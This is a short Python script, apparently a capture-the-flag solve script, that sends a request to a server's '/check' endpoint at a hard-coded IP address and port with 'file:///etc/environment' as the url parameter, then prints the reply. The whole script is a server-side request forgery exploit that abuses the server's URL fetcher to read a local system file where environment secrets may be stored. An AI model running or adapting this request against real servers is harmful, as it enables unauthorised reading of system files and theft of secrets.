import requests

URL = "http://52.79.219.221:23001"

r = requests.get(f"{URL}/check", params={
    'url': 'file:///etc/environment'
})
print(r.text)